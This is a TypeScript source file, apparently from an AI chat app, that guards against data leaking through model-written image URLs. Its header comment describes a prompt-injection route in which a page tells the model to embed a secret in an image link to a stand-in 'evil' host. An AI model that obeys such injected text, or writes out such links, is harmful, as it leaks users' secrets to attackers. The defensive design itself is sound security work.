// Pictures a reply links to on the web (`![](https://…)`). The renderer's CSP
// allows only `self` and data: images, so the server fetches the picture and
// hands it over as a data URL, the way it does for Sources favicons.
//
// Fetching whatever URL a reply names would turn every reply into a way out:
// a page the model read can tell it to write `![](https://evil/?q=<secret>)`,
// and the fetch delivers the secret no matter who makes it. So a URL is
// fetched only when it reached the chat from outside a model before any model
// wrote it — the user's own words, or what a web tool brought back from a page.
// Tools that compute (a shell, a file write, an echo-like MCP) are not trusted:
// a model can have one assemble a URL that never appears in its own words.
// URLs are compared whole, never by substring, so the model can't encode data
// in which prefix of a long URL it repeats. Two forms of a URL a page offered
// also count: a scheme-relative `//host/…` read as https (Wikipedia writes its
// pictures so), and the URL with its whole query removed (models drop tracker
// tails like `?utm_source=…`). Each of these is one more URL to choose, not a
// way to spell new text. The choice among URLs a page offers still says
// something, so each chat fetches a bounded number of them.
// Everything else renders as a link the user can open.
//
// Not covered: a model with web tools can have a reflecting site (one that
// decodes its query into its response) hand back a URL it built. That buys it
// nothing, because the same model can already fetch_content the attacker's
// URL directly. The check exists so that rendering a reply is never a way out
// that the turn's own tools weren't already.

import { fetchPublicImage, isFetchableHost, limited, type ImageFetchLimits } from './favicon';

const LIMITS: ImageFetchLimits = {
  maxBytes: 8 * 1024 * 1024,
  timeoutMs: 10_000,
  // SVG is excluded on purpose: it is a document, not a picture.
  types: /^image\/(png|gif|jpeg|webp|avif)$/,
  userAgent: 'Mozilla/5.0 (compatible; Stem image)'
};
const MAX_URL_LENGTH = 2048;
/** Bytes of data URLs kept in memory across every chat and client. */
const CACHE_BUDGET = 64 * 1024 * 1024;

/** Distinct pictures one chat may fetch (per server run). */
const PER_THREAD = 24;

/** Tools whose output is what a web page or search said, not what a model computed. */
const WEB_TOOLS = new Set(['web_search', 'fetch_content', 'get_search_content', 'source_check']);
/** Ends the context Stem prepends to a user message (memory, folder excerpts…). */
const CONTEXT_END = '<!--/stem:context-->';

type Mention = 'input' | 'model' | null;

function textOf(content: unknown): string {
  if (typeof content === 'string') return content;
  if (!Array.isArray(content)) return '';
  return content
    .map((p) => (p && typeof p === 'object' && (p as { type?: unknown }).type === 'text' ? String((p as { text?: unknown }).text ?? '') : ''))
    .join('\n');
}

/** What a user message says in the user's own words: the text after Stem's context block. */
function userWords(content: unknown): string {
  const text = textOf(content);
  const end = text.lastIndexOf(CONTEXT_END);
  return end === -1 ? text : text.slice(end + CONTEXT_END.length);
}

/** Every whole http(s) URL in a text, trailing sentence punctuation trimmed. */
export function urlsIn(text: string): Set<string> {
  const out = new Set<string>();
  for (const m of text.matchAll(/https?:\/\/[^\s"'<>()[\]{}\\`]+/gi)) out.add(m[0].replace(/[.,;:!?]+$/, ''));
  return out;
}

function names(text: string, url: string): boolean {
  return text.includes(url) && urlsIn(text).has(url);
}

/** `url` without its scheme: the part every form of it a page offers contains. */
function schemeless(url: string): string {
  return url.replace(/^https?:/i, '');
}

/**
 * Whether a page's text offers `url`: whole, scheme-relative (`//host/…` read
 * as https), or with the whole query (and fragment) removed.
 */
function offers(text: string, url: string): boolean {
  if (!text.includes(schemeless(url))) return false;
  for (const m of text.matchAll(/(?:https?:)?\/\/[^\s"'<>()[\]{}\\`]+/gi)) {
    let found = m[0].replace(/[.,;:!?]+$/, '');
    if (found.startsWith('//')) found = `https:${found}`;
    if (found === url) return true;
    const tail = found.search(/[?#]/);
    if (tail > 0 && found.slice(0, tail) === url) return true;
  }
  return false;
}

function mentionIn(entry: unknown, url: string): Mention {
  if (!entry || typeof entry !== 'object') return null;
  // A model mention counts in every form a page could offer it back in, so
  // a web tool that echoes a model-written `//host/…` can't launder it.
  const seen = jsonNeedle(url);
  const e = entry as { type?: unknown; customType?: unknown; message?: unknown; role?: unknown };
  const message = (e.type === 'message' ? e.message : e.role ? e : null) as { role?: unknown; content?: unknown; toolName?: unknown } | null;
  if (!message) {
    // A web tool's stored results. The query in there is the model's, but its
    // tool call (which carries the same query) comes first.
    if (e.type === 'custom' && e.customType === 'web-search-results') return offers(JSON.stringify(entry), url) ? 'input' : null;
    return JSON.stringify(entry).includes(seen) ? 'model' : null;
  }
  switch (message.role) {
    case 'user':
      if (names(userWords(message.content), url)) return 'input';
      // In the context block only: memory summaries are model-written, so
      // this is no evidence either way.
      return null;
    case 'toolResult':
      if (WEB_TOOLS.has(String(message.toolName))) return offers(textOf(message.content), url) ? 'input' : null;
      return JSON.stringify(message.content ?? '').includes(seen) ? 'model' : null;
    default:
      // The model's own words and anything else: a mention here, even inside
      // a longer URL, means a model had a hand in it.
      return JSON.stringify(message).includes(seen) ? 'model' : null;
  }
}

/**
 * Whether `url` first appears in a thread's entries (in session order) as
 * input from outside a model. Accepts session-file entries or bare messages.
 */
export function cameFromInput(entries: Iterable<unknown>, url: string): boolean {
  for (const entry of entries) {
    const seen = mentionIn(entry, url);
    if (seen) return seen === 'input';
  }
  return false;
}

/**
 * Text every session line that names `url` in any accepted form contains, as
 * written inside a JSON string: for skipping lines cheaply before parsing.
 */
export function jsonNeedle(url: string): string {
  return JSON.stringify(schemeless(url)).slice(1, -1);
}

/** Whether a URL is worth asking about at all: https, a public name, a sane length. */
export function isRemoteImageUrl(url: string): boolean {
  if (url.length > MAX_URL_LENGTH) return false;
  let parsed: URL;
  try {
    parsed = new URL(url);
  } catch {
    // quiet: not a URL at all, so not a picture to fetch; it renders as its link
    return false;
  }
  return parsed.protocol === 'https:' && isFetchableHost(parsed.hostname) && !parsed.username && !parsed.password;
}

const cache = new Map<string, Promise<string | null>>();
const sizes = new Map<string, number>();
let cached = 0;
/** threadId + url pairs already found to have come from input. */
const vetted = new Set<string>();
/** How many distinct pictures each chat has fetched. */
const perThread = new Map<string, number>();

function remember(url: string, dataUrl: string): void {
  sizes.set(url, dataUrl.length);
  cached += dataUrl.length;
  for (const [key, size] of sizes) {
    if (cached <= CACHE_BUDGET) break;
    sizes.delete(key);
    cache.delete(key);
    cached -= size;
  }
}

function fetchCached(url: string): Promise<string | null> {
  let hit = cache.get(url);
  if (!hit) {
    // quiet: a picture that won't load renders as its link, which the
    // renderer draws for any null.
    hit = limited(() => fetchPublicImage(new URL(url), LIMITS)).catch(() => null);
    cache.set(url, hit);
    void hit.then((dataUrl) => {
      // Failures aren't kept: the next open of the chat asks again.
      if (dataUrl) remember(url, dataUrl);
      else cache.delete(url);
    });
  }
  return hit;
}

/**
 * A picture a reply in `threadId` links to, as a data URL, or null when the
 * URL didn't come from outside a model, or the fetch was refused or failed.
 * `fromInput` answers the provenance question from the thread's session.
 */
export async function remoteImageFor(
  threadId: string,
  url: string,
  fromInput: (threadId: string, url: string) => Promise<boolean>,
  fetchImage: (url: string) => Promise<string | null> = fetchCached
): Promise<string | null> {
  if (!threadId || !isRemoteImageUrl(url)) return null;
  const key = `${threadId}\n${url}`;
  if (!vetted.has(key)) {
    if ((perThread.get(threadId) ?? 0) >= PER_THREAD) return null;
    if (!(await fromInput(threadId, url))) return null;
    perThread.set(threadId, (perThread.get(threadId) ?? 0) + 1);
    vetted.add(key);
  }
  return fetchImage(url);
}
